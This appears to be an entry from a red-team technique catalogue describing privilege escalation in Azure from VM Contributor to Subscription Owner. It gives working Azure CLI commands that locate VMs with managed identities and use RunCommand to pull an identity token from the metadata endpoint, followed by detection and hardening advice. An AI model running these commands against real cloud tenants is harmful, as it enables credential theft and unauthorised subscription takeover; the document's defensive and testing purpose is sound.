# [PE-VALID-012]: Azure VM Contributor to Owner

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-012 |
| **MITRE ATT&CK v18.1** | [Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / Azure |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The `Virtual Machine Contributor` role allows a user to manage VMs (start, stop, delete). Crucially, it also allows running **command execution** on the VM via `RunCommand` or resetting the password via `VMAccessAgent`. If the target VM has a Managed Identity with higher privileges (e.g., Subscription Owner) attached to it, the "Contributor" can execute a script to steal the Managed Identity token (See PE-VALID-011), thereby elevating from VM Contributor to Subscription Owner.
- **Attack Surface:** Azure VMs with Managed Identities.
- **Business Impact:** **Indirect Privilege Escalation**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** `Virtual Machine Contributor` on a VM that has a privileged Identity.
- **Tools:**
    - Azure CLI / Portal

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Identify Target VM**
Find a VM with a System Assigned Identity.
```bash
az vm list --query "[?identity!=null].{Name:name, ID:identity.principalId}"
```

**Step 2: Run Command**
Execute a script to exfiltrate the token.
```bash
az vm run-command invoke --command-id RunShellScript --name <VMName> --resource-group <RG> --scripts "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H 'Metadata: true'"
```

**Step 3: Abuse Token**
Use the returned token to perform admin actions.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Azure Activity Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Compute** | `Run Command` | Usage of `RunCommand` or `VMAccessAgent` (Reset Password) by a non-owner/non-admin user on a sensitive VM. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Role Separation:** Do not assign high-privilege Managed Identities to VMs managed by lower-privilege users (`VM Contributors`).
*   **Custom Roles:** Create a custom role for VM operators that removes `Microsoft.Compute/virtualMachines/runCommand/action` if they don't need it.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-PHISH-005]
> **Next Logical Step:** [PE-VALID-011]
